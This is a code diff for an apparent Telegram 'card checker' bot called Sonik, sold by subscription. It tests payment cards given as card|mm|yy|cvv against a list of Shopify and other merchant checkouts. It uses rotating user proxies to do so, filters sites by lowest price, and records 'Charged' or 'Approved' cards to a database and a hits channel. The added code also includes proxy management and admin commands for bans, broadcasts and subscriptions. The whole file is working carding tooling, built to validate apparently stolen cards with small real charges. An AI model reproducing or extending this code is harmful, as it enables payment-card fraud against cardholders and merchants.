+        return await styled_reply(event, f"⚠️ <b>{bs('No valid URLs')}</b>", emoji_ids=[CE["cross"]])
+
+    existing = await get_global_sites()
+
+    removed = []
+
+    for s in to_rm:
+
+        norm = normalize_site_url(s)
+
+        for ex in existing:
+
+            if normalize_site_url(ex) == norm:
+
+                if await remove_global_site(ex):
+
+                    removed.append(ex)
+
+                break
+
+    await styled_reply(event, f"✅ <b>{bs('Removed')}:</b> <code>{len(removed)}</code>", emoji_ids=[CE["check"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]sites$'))
+
+async def list_sites(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    sites = await get_global_sites()
+
+    if not sites:
+
+        return await styled_reply(event, f"📋 <b>{bs('No sites')}</b> <code>/add</code>", emoji_ids=[CE["warn"]])
+
+    text = f"🌐 <b>{bs('Global Sites')}</b> ({len(sites)}) 🌐\n<b>━━━━━━━━━━━━━━━━━</b>\n"
+
+    eid = [CE["fire"], CE["fire"]]
+
+    for i, s in enumerate(sites[:50], 1):
+
+        text += f"🔗 <code>{i}.</code> <b>{s}</b>\n"
+
+        eid.append(CE["link"])
+
+    if len(sites) > 50:
+
+        text += f"\n<i>+{len(sites)-50} more</i>"
+
+    await styled_reply(event, text, emoji_ids=eid)
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]site\b'))
+
+async def check_sites_with_filter_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return await styled_reply(event, f"🚫 <b>{bs('Admin only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    sites = await get_global_sites()
+
+    if not sites:
+
+        return await styled_reply(event, f"📋 <b>{bs('No sites')}</b>", emoji_ids=[CE["warn"]])
+
+    kb = [
+
+        [pbtn(f"💰 {bs('0.01-5 USD')}", f"site_price_range:1:{event.sender_id}"), pbtn(f"💰 {bs('0.01-10 USD')}", f"site_price_range:2:{event.sender_id}")],
+        [pbtn(f"💰 {bs('0.01-20 USD')}", f"site_price_range:3:{event.sender_id}"), pbtn(f"💰 {bs('0.01-40 USD')}", f"site_price_range:4:{event.sender_id}")],
+        [pbtn(f"💰 {bs('5-10 USD')}", f"site_price_range:5:{event.sender_id}"), pbtn(f"💰 {bs('5-20 USD')}", f"site_price_range:6:{event.sender_id}")],
+
+        [pbtn(f"💰 {bs('10-20 USD')}", f"site_price_range:7:{event.sender_id}"), pbtn(f"💰 {bs('20-40 USD')}", f"site_price_range:8:{event.sender_id}")],
+
+        [pbtn(f"📊 {bs('All Sites (No Filter)')}", f"site_price_range:0:{event.sender_id}")],
+
+    ]
+
+    await styled_reply(event, f"""🔍 <b>{bs('Site Check with Filter')}</b> 🔍
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🌐 <b>{bs('Total Sites')}:</b> <code>{len(sites)}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+💰 <i>{bs('Select price range to filter')}</i>
+
+✅ <i>{bs('Only sites with accepted responses are kept')}</i>""", buttons=kb, emoji_ids=[CE["fire"], CE["fire"], CE["globe"], CE["info"]])
+
+
+
+@client.on(events.CallbackQuery(pattern=rb"site_price_range:(\d+):(\d+)"))
+
+async def site_price_range_cb(event):
+
+    range_id = int(event.pattern_match.group(1).decode())
+
+    admin_id = int(event.pattern_match.group(2).decode())
+
+    if event.sender_id != admin_id:
+
+        return await event.answer(f"🚫 {bs('Not for you')}!", alert=True)
+
+    await event.answer(f"🔍 {bs('Checking sites...')}!")
+
+    try:
+
+        await event.delete()
+
+    except:
+
+        pass
+
+    if range_id == 0:
+
+        price_range = {"min": 0, "max": 9999, "name": "All Sites"}
+
+    else:
+
+        price_range = PRICE_RANGES.get(str(range_id), PRICE_RANGES["1"])
+
+    asyncio.create_task(_process_site_check_with_filter(event, price_range))
+
+
+
+async def _process_site_check_with_filter(event, price_range):
+
+    uid = event.sender_id
+
+    sites = await get_global_sites()
+
+    total = len(sites)
+
+    tested = 0
+
+    alive = 0
+
+    dead = 0
+
+    price_filtered = 0
+
+    kept = 0
+
+    rejected_gateway = 0
+
+    proxies = await get_all_user_proxies(uid)
+
+    user_site_sem = get_user_sem(uid, "site")
+
+    http_session = await get_user_http_session(uid, "site")
+
+    sm = await styled_reply(event, f"🔍 <b>{bs('Checking')} {total} {bs('sites')}...</b>", emoji_ids=[CE["fire"]])
+
+    results = []
+
+    
+
+    async def check_worker(site):
+
+        nonlocal tested, alive, dead, price_filtered, kept, rejected_gateway
+
+        async with user_site_sem:
+
+            try:
+
+                res = await verify_site_full(site, random.choice(proxies) if proxies else None, http_session=http_session)
+
+                tested += 1
+
+                
+
+                if res['status'] == 'rejected':
+
+                    rejected_gateway += 1
+
+                elif res['status'] == 'alive':
+
+                    price_val = res.get('price_val', 999)
+
+                    if price_val <= price_range["max"] and price_val >= price_range["min"]:
+
+                        alive += 1
+
+                        kept += 1
+
+                        results.append({'site': site, 'status': 'alive', 'price': res.get('price', '-'), 'price_val': price_val, 'gateway': res.get('gateway', 'unknown')})
+
+                    else:
+
+                        price_filtered += 1
+
+                else:
+
+                    dead += 1
+
+                
+
+                if tested % 10 == 0 or tested == total:
+
+                    try:
+
+                        await styled_edit(sm, f"🔍 <b>{bs('Checking')}...</b> {tested}/{total} | ✅{alive} ❌{dead} | 🚫{rejected_gateway} | 📋{kept}", emoji_ids=[CE["fire"]])
+
+                    except:
+
+                        pass
+
+            except:
+
+                dead += 1
+
+                tested += 1
+
+    
+
+    for i in range(0, len(sites), SITE_PER_USER_WORKERS):
+
+        await asyncio.gather(*[asyncio.create_task(check_worker(s)) for s in sites[i:i+SITE_PER_USER_WORKERS]], return_exceptions=True)
+
+    
+
+    removed_count = 0
+
+    for site in sites:
+
+        norm = normalize_site_url(site)
+
+        found = False
+
+        for r in results:
+
+            if normalize_site_url(r['site']) == norm:
+
+                found = True
+
+                break
+
+        if not found:
+
+            if await remove_global_site(site):
+
+                removed_count += 1
+
+    
+
+    results.sort(key=lambda x: x['price_val'])
+
+    top_sites_text = ""
+
+    for i, r in enumerate(results[:20], 1):
+
+        gw_flag = "🛍️" if r.get('gateway') == 'shopify' else "💳"
+
+        top_sites_text += f"🔗 <code>{i}.</code> {gw_flag} <b>{r['site']}</b> ━ <code>{r['price']}</code>\n"
+
+    
+
+    await styled_edit(sm, f"""✅ <b>{bs('Site Check Complete')}</b> ✅
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+💰 <b>{bs('Filter')}:</b> <code>{price_range['name']}</code>
+
+🔍 <b>{bs('Total Tested')}:</b> <code>{total}</code>
+
+✅ <b>{bs('Alive')}:</b> <code>{alive}</code>
+
+❌ <b>{bs('Dead')}:</b> <code>{dead}</code>
+
+🚫 <b>{bs('Rejected (Dead/Error/Invalid Response)')}:</b> <code>{rejected_gateway}</code>
+
+💰 <b>{bs('Price Filtered Out')}:</b> <code>{price_filtered}</code>
+
+📋 <b>{bs('Removed from sites.txt')}:</b> <code>{removed_count}</code>
+
+📋 <b>{bs('Kept in sites.txt')}:</b> <code>{kept}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🏆 <b>{bs('Top Sites (Lowest Price)')}:</b>
+
+{top_sites_text if top_sites_text else 'None'}
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🛍️ = Shopify | 💳 = Other Gateway""", emoji_ids=[CE["check"], CE["check"], CE["fire"], CE["globe"], CE["cross"], CE["chart"], CE["star"]])
+
+    
+
+    await cleanup_user_http_session(uid, "site")
+
+    cleanup_user_sem(uid)
+
+
+
+# ====================== PROXY COMMANDS ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
+
+async def add_proxy_cmd(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if event.is_group:
+
+        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
+
+        return
+
+    try:
+
+        lines = []
+
+        if event.is_reply:
+
+            rm = await event.get_reply_message()
+
+            if rm.file:
+
+                fp = await rm.download_media()
+
+                try:
+
+                    async with aiofiles.open(fp, "r", encoding="utf-8") as f:
+
+                        lines = [l.strip() for l in (await f.read()).splitlines() if l.strip()]
+
+                finally:
+
+                    try:
+
+                        os.remove(fp)
+
+                    except:
+
+                        pass
+
+            elif rm.text:
+
+                lines = [l.strip() for l in rm.text.splitlines() if l.strip()]
+
+        else:
+
+            p = event.raw_text.split(maxsplit=1)
+
+            if len(p) == 2:
+
+                lines = [l.strip() for l in p[1].splitlines() if l.strip()]
+
+            else:
+
+                return await styled_reply(event, f"📝 <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
+
+        if not lines:
+
+            return await styled_reply(event, f"⚠️ <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
+
+        cc = await get_proxy_count(event.sender_id)
+
+        if cc >= 1000:
+
+            return await styled_reply(event, f"🚫 <b>{bs('Limit 1000/1000')}</b>", emoji_ids=[CE["cross"]])
+
+        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
+
+        parsed = []
+
+        for l in lines:
+
+            pd = parse_proxy_format(l)
+
+            if pd and pd['proxy_url'] not in existing:
+
+                parsed.append(pd)
+
+                existing.add(pd['proxy_url'])
+
+        if not parsed:
+
+            return await styled_reply(event, f"⚠️ <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
+
+        parsed = parsed[:1000-cc]
+
+        tm = await styled_reply(event, f"🛡️ <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
+
+        
+
+        added, failed = [], []
+
+        batch_size = PROXY_CHECK_BATCH
+
+        for i in range(0, len(parsed), batch_size):
+
+            batch = parsed[i:i+batch_size]
+
+            results = await test_proxies_batch(batch)
+
+            for pd2, res in zip(batch, results):
+
+                if isinstance(res, tuple) and res[0]:
+
+                    await add_proxy_db(event.sender_id, pd2)
+
+                    added.append(1)
+
+                else:
+
+                    failed.append(1)
+
+        
+
+        await styled_edit(tm, f"✅ <b>{bs('Done')}</b> ✅{len(added)} ❌{len(failed)} | 📋 {bs('Total')}: {cc+len(added)}/1000", emoji_ids=[CE["fire"]])
+
+    except Exception as e:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
+
+async def view_proxies(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if event.is_group:
+
+        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
+
+        return
+
+    proxies = await get_all_user_proxies(event.sender_id)
+
+    if not proxies:
+
+        return await styled_reply(event, f"📋 <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
+
+    text = f"🛡️ <b>{bs('Proxies')}</b> ({len(proxies)}/1000) 🛡️\n<b>━━━━━━━━━━━━━━━━━</b>\n"
+
+    eid = [CE["fire"], CE["fire"]]
+
+    for i, p in enumerate(proxies[:30], 1):
+
+        text += f"🔗 <code>{i}.</code> 🌐 <b>{p['ip']}:{p['port']}</b>\n"
+
+        eid.append(CE["link"])
+
+    if len(proxies) > 30:
+
+        text += f"\n<i>+{len(proxies)-30} more</i>"
+
+    text += f"\n🗑️ <code>/rmpxy index</code>"
+
+    eid.append(CE["trash"])
+
+    await styled_reply(event, text, emoji_ids=eid)
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
+
+async def remove_proxy_cmd(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if event.is_group:
+
+        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
+
+        return
+
+    proxies = await get_all_user_proxies(event.sender_id)
+
+    if not proxies:
+
+        return await styled_reply(event, f"📋 <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
+
+    p = event.raw_text.split(maxsplit=1)
+
+    if len(p) == 1:
+
+        return await styled_reply(event, f"📝 <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
+
+    arg = p[1].strip().lower()
+
+    if arg == 'all':
+
+        c = await clear_all_proxies(event.sender_id)
+
+        return await styled_reply(event, f"🗑️ <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
+
+    try:
+
+        idx = int(arg) - 1
+
+        if 0 <= idx < len(proxies):
+
+            rm = await remove_proxy_by_index(event.sender_id, idx)
+
+            await styled_reply(event, f"🗑️ <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
+
+        else:
+
+            await styled_reply(event, f"⚠️ <b>{bs('Invalid index')}</b>", emoji_ids=[CE["cross"]])
+
+    except:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
+
+async def check_proxies_cmd(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if event.is_group:
+
+        return await styled_reply(event, f"🔒 <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    if not await require_subscription(event) and event.sender_id not in ADMIN_ID:
+
+        return
+
+    proxies = await get_all_user_proxies(event.sender_id)
+
+    if not proxies:
+
+        return await styled_reply(event, f"📋 <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
+
+    sm = await styled_reply(event, f"🛡️ <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
+
+    
+
+    results = await test_proxies_batch(proxies)
+
+    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
+
+    await styled_edit(sm, f"🛡️ <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}", emoji_ids=[CE["shield"]])
+
+
+
+# ====================== /sp (Single CC) ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
+
+async def single_cc_check(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    uid = event.sender_id
+
+    if uid not in ADMIN_ID and not await is_user_subscribed(uid):
+
+        return await send_no_subscription_message(event)
+
+    await update_last_seen(uid)
+
+    try:
+
+        sender = await event.get_sender()
+
+        username = sender.username or f"user_{uid}"
+
+        name = sender.first_name or username
+
+    except:
+
+        username, name = f"user_{uid}", "User"
+
+    sites = await get_global_sites()
+
+    if not sites:
+
+        return await styled_reply(event, f"⚠️ <b>{bs('No sites available. Admin please add sites.')}</b>", emoji_ids=[CE["warn"]])
+
+    proxies = await get_all_user_proxies(uid)
+
+    
+
+    # ===== PROXY REQUIRED =====
+
+    if not proxies:
+
+        return await styled_reply(event, f"""🛡️ <b>{bs('No Proxies Found')}</b> 🛡️
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+⚠️ <b>{bs('You must add proxies first')}</b>
+
+💡 <i>{bs('Use /addpxy to add proxies')}</i>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/addpxy ip:port:user:pass</code>
+
+💡 <i>{bs('Then try /sp again')}</i>""", emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["link"], CE["info"]])
+
+    
+
+    rm = await event.get_reply_message() if event.reply_to_msg_id else None
+
+    card = None
+
+    if rm and rm.text:
+
+        cc = extract_cc(rm.text)
+
+        if cc:
+
+            card = cc[0]
+
+    if not card:
+
+        cc = extract_cc(event.message.text)
+
+        if cc:
+
+            card = cc[0]
+
+    if not card:
+
+        return await styled_reply(event, f"📝 <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
+
+    lm = await styled_reply(event, f"⏳ {bs('Processing')}… ⏳")
+
+    st = time.time()
+
+    rotator = SmartRotator()
+
+    try:
+
+        http_session = await get_user_http_session(uid, "sp")
+
+        async with get_user_sem(uid, "sp"):
+
+            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
+
+            result = await check_card_with_retry(card, sites, uid, proxies, 3, rotator, http_session=http_session)
+
+            bi = await bin_task
+
+        elapsed = round(time.time() - st, 2)
+
+        status = result.get('Status', 'Declined')
+
+        if status in ["Charged", "Approved"]:
+
+            asyncio.create_task(save_card_to_db(card, status.upper(), result.get('Response', ''), result.get('Gateway', ''), result.get('Price', '')))
+
+        msg, eid = format_simple_card_result(status, card, result.get('Gateway', '?'), result.get('Response', '')[:150], bi, elapsed, extra_field=("Price", result.get('Price', '-')) if result.get('Price', '-') != '-' else None)
+
+        try:
+
+            await lm.delete()
+
+        except:
+
+            pass
+
+        HIT_BUTTON = [[Button.url("🚀 " + bs("Sonik"), f"https://t.me/{MAIN_BOT_USERNAME}")]]
+
+        await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)
+
+        if status == "Charged":
+
+            asyncio.create_task(send_channel_hit(result, uid, username, name))
+
+        elif status == "Approved":
+
+            asyncio.create_task(send_channel_hit(result, uid, username, name))
+
+    except Exception as e:
+
+        try:
+
+            await lm.delete()
+
+        except:
+
+            pass
+
+        await styled_reply(event, f"⚠️ <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])
+
+
+
+# ====================== /info ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]info$'))
+
+async def info_cmd(event):
+
+    if await check_maintenance(event):
+
+        return
+
+    if not await force_join_check(event):
+
+        return
+
+    if await is_banned_user(event.sender_id):
+
+        t, e = banned_user_message()
+
+        return await styled_reply(event, t, emoji_ids=e)
+
+    await ensure_user(event.sender_id)
+
+    sub = await get_user_subscription(event.sender_id)
+
+    pc = await get_proxy_count(event.sender_id)
+
+    if event.sender_id in ADMIN_ID:
+
+        status_text = f"👑 {bs('Admin')}"
+
+        se = [CE["crown"]]
+
+    elif sub["is_active"]:
+
+        remaining = sub["remaining_hours"]
+
+        remaining_str = f"{int(remaining * 60)} min" if remaining < 1 else f"{remaining:.1f} h"
+
+        status_text = f"✅ {bs('Active')} | {remaining_str}"
+
+        se = [CE["check"]]
+
+    else:
+
+        status_text = f"❌ {bs('No Subscription')}"
+
+        se = [CE["cross"]]
+
+    await styled_reply(event, f"""👤 <b>{bs('Profile')}</b> 👤
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🆔 <b>{bs('ID')}:</b> <code>{event.sender_id}</code>
+
+📊 <b>{bs('Status')}:</b> <code>{status_text}</code>
+
+🛡️ <b>{bs('Proxies')}:</b> <code>{pc}/{bs('1000')}</code>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+🤖 <b>@{PAYMENT_BOT_USERNAME}</b> {bs('to subscribe')}
+
+🎁 <code>/redeem</code> {bs('to use a code')}""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["shield"], CE["link"]] + se)
+
+
+
+# ====================== ADMIN COMMANDS ======================
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
+
+async def maint_toggle(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    a = event.raw_text.lower().split()[1]
+
+    await set_maintenance_mode(a == "on")
+
+    await styled_reply(event, f"🔧 <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]ban\b'))
+
+async def block_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    parts = event.raw_text.split()
+
+    if len(parts) < 2:
+
+        return await styled_reply(event, f"📝 <code>/ban user_id</code>", emoji_ids=[CE["warn"]])
+
+    try:
+
+        target_uid = int(parts[1])
+
+    except ValueError:
+
+        return await styled_reply(event, f"⚠️ <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
+
+    await ensure_user(target_uid)
+
+    await ban_user(target_uid, event.sender_id)
+
+    if target_uid in ACTIVE_MTXT_PROCESSES:
+
+        proc = ACTIVE_MTXT_PROCESSES[target_uid]
+
+        if isinstance(proc, dict):
+
+            proc["stopped"] = True
+
+            for t in proc.get("tasks", []):
+
+                if not t.done():
+
+                    t.cancel()
+
+    await styled_reply(event, f"🚫 <b>{bs('Blocked')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
+
+    try:
+
+        await styled_send(target_uid, f"🚫 <b>{bs('You have been blocked from using Sonik')}</b>\n💡 <i>{bs('Contact admin if you think this is a mistake')}</i>", emoji_ids=[CE["stop"], CE["info"]])
+
+    except:
+
+        pass
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]unban\b'))
+
+async def unblock_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    
+
+    parts = event.raw_text.split()
+
+    if len(parts) < 2:
+
+        return await styled_reply(event, f"📝 <code>/unban user_id</code>", emoji_ids=[CE["warn"]])
+
+    
+
+    try:
+
+        target_uid = int(parts[1])
+
+    except ValueError:
+
+        return await styled_reply(event, f"⚠️ <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
+
+    
+
+    await ensure_user(target_uid)
+
+    
+
+    is_banned = await is_banned_user(target_uid)
+
+    if not is_banned:
+
+        return await styled_reply(event, f"✅ <b>{bs('User is not banned')}</b>", emoji_ids=[CE["warn"]])
+
+    
+
+    success = await unban_user(target_uid)
+
+    
+
+    if success:
+
+        await styled_reply(event, f"✅ <b>{bs('Unblocked')}</b> <code>{target_uid}</code>", emoji_ids=[CE["check"]])
+
+        try:
+
+            await styled_send(target_uid, 
+
+                f"✅ <b>{bs('You have been unblocked')}</b>\n"
+
+                f"📝 <code>/start</code> {bs('to use Sonik again')}", 
+
+                emoji_ids=[CE["check"], CE["info"]])
+
+        except:
+
+            pass
+
+    else:
+
+        await styled_reply(event, f"⚠️ <b>{bs('Failed to unblock user')}</b>", emoji_ids=[CE["cross"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]users$'))
+
+async def users_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    users = await get_all_users()
+
+    if not users:
+
+        return await styled_reply(event, f"📋 <b>{bs('No users found')}</b>", emoji_ids=[CE["warn"]])
+
+    text = f"👥 <b>{bs('Users List')}</b> ({len(users)}) 👥\n<b>━━━━━━━━━━━━━━━━━</b>\n"
+
+    eid = [CE["fire"], CE["fire"]]
+
+    for i, u in enumerate(users[:30], 1):
+
+        uid = u.get('user_id', '?')
+
+        banned = "🔴" if u.get('banned', False) else "🟢"
+
+        last_seen = u.get('last_seen')
+
+        last_seen_str = last_seen.strftime('%m-%d %H:%M') if last_seen else 'Never'
+
+        sub_end = u.get('subscription_end')
+
+        is_sub_active = False
+
+        if sub_end and isinstance(sub_end, datetime):
+
+            if sub_end.tzinfo is None:
+
+                sub_end = sub_end.replace(tzinfo=timezone.utc)
+
+            if datetime.now(timezone.utc) < sub_end:
+
+                is_sub_active = True
+
+        elif u.get('subscription_plan') == 'unlimited':
+
+            is_sub_active = True
+
+        sub_status = "✅" if is_sub_active else "❌"
+
+        text += f"🆔 {banned} {sub_status} <code>{i}.</code> <b>{uid}</b> ━ {last_seen_str}\n"
+
+        eid.append(CE["link"])
+
+    if len(users) > 30:
+
+        text += f"\n<i>+{len(users)-30} more</i>"
+
+    text += f"\n<b>━━━━━━━━━━━━━━━━━</b>\n🟢 Active | 🔴 Blocked | ✅ Subscribed | ❌ No Sub"
+
+    await styled_reply(event, text, emoji_ids=eid)
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]broadcast\b'))
+
+async def broadcast_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    
+
+    reply_msg = await event.get_reply_message()
+
+    broadcast_text = None
+
+    
+
+    if reply_msg:
+
+        if reply_msg.text:
+
+            broadcast_text = reply_msg.text
+
+        elif reply_msg.media:
+
+            broadcast_text = None
+
+            await styled_reply(event, f"""📢 <b>{bs('Broadcast Media?')}</b>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📤 {bs('This will forward the media to ALL users.')}
+
+❓ {bs('Are you sure?')}
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ {bs('Click confirm to proceed.')}""", buttons=[[pbtn("✅ " + bs("Confirm Broadcast"), f"confirm_broadcast_media:{event.sender_id}")], [pbtn("❌ " + bs("Cancel"), f"cancel_broadcast")]], emoji_ids=[CE["warn"], CE["info"]])
+
+            async def cb(wait_event):
+
+                if wait_event.data.startswith(b"confirm_broadcast_media"):
+
+                    if int(wait_event.data.split(b":")[1]) == event.sender_id:
+
+                        await wait_event.answer(f"📤 {bs('Broadcasting...')}!")
+
+                        await wait_event.delete()
+
+                        await broadcast_to_all_users(event, msg=None, media_msg=reply_msg)
+
+                elif wait_event.data == b"cancel_broadcast":
+
+                    await wait_event.answer(f"❌ {bs('Cancelled.')}!")
+
+                    try:
+
+                        await wait_event.delete()
+
+                    except: pass
+
+            client.add_event_handler(cb, events.CallbackQuery)
+
+            return
+
+    else:
+
+        parts = event.raw_text.split(maxsplit=1)
+
+        if len(parts) < 2:
+
+            return await styled_reply(event, f"""📢 <b>{bs('Broadcast')}</b> 📢
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/broadcast Your message here</code>
+
+💡 {bs('Or reply to a message with /broadcast')}""", emoji_ids=[CE["info"]])
+
+        broadcast_text = parts[1]
+
+    
+
+    if not broadcast_text and not reply_msg:
+
+        return
+
+    
+
+    await styled_reply(event, f"""📢 <b>{bs('Broadcast Message?')}</b>
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📤 {bs('This will send the following to ALL users:')}
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+{broadcast_text[:300]}
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+❓ {bs('Are you sure?')}
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+✅ {bs('Click confirm to proceed.')}""", buttons=[[pbtn("✅ " + bs("Confirm Broadcast"), f"confirm_broadcast_text:{event.sender_id}")], [pbtn("❌ " + bs("Cancel"), f"cancel_broadcast")]], emoji_ids=[CE["warn"], CE["info"]])
+
+    
+
+    async def cb(wait_event):
+
+        if wait_event.data.startswith(b"confirm_broadcast_text"):
+
+            if int(wait_event.data.split(b":")[1]) == event.sender_id:
+
+                await wait_event.answer(f"📤 {bs('Broadcasting...')}!")
+
+                await wait_event.delete()
+
+                await broadcast_to_all_users(event, msg=broadcast_text, media_msg=None)
+
+        elif wait_event.data == b"cancel_broadcast":
+
+            await wait_event.answer(f"❌ {bs('Cancelled.')}!")
+
+            try:
+
+                await wait_event.delete()
+
+            except: pass
+
+    client.add_event_handler(cb, events.CallbackQuery)
+
+
+
+async def broadcast_to_all_users(original_event, msg, media_msg):
+
+    users = await get_all_users()
+
+    if not users:
+
+        await styled_reply(original_event, f"⚠️ <b>{bs('No users to broadcast to')}</b>", emoji_ids=[CE["warn"]])
+
+        return
+
+    
+
+    success = 0
+
+    fail = 0
+
+    status_msg = await styled_reply(original_event, f"📤 <b>{bs('Broadcasting...')}</b>\n0/{len(users)}", emoji_ids=[CE["fire"]])
+
+    
+
+    for user in users:
+
+        uid = user.get('user_id')
+
+        if not uid:
+
+            continue
+
+        try:
+
+            if media_msg:
+
+                await client.forward_messages(uid, media_msg)
+
+            else:
+
+                await styled_send(uid, msg, emoji_ids=[CE["star"]])
+
+            success += 1
+
+        except:
+
+            fail += 1
+
+        if (success + fail) % 10 == 0:
+
+            try:
+
+                await styled_edit(status_msg, f"📤 <b>{bs('Broadcasting...')}</b>\n{success+fail}/{len(users)}\n✅ {success} | ❌ {fail}", emoji_ids=[CE["fire"]])
+
+            except: pass
+
+        await asyncio.sleep(0.05)
+
+    
+
+    await styled_edit(status_msg, f"""✅ <b>{bs('Broadcast Complete')}</b>
+
+✅ {bs('Sent')}: {success}
+
+❌ {bs('Failed')}: {fail}""", emoji_ids=[CE["check"], CE["cross"]])
+
+
+
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]give\b'))
+
+async def give_subscription_cmd(event):
+
+    if event.sender_id not in ADMIN_ID:
+
+        return
+
+    parts = event.raw_text.split()
+
+    if len(parts) < 3:
+
+        return await styled_reply(event, f"""🎁 <b>{bs('Give Subscription')}</b> 🎁
+
+<b>━━━━━━━━━━━━━━━━━</b>
+
+📝 <code>/give user_id hours</code>
+
+💡 <i>{bs('Example: /give 123456789 24')}</i>
+
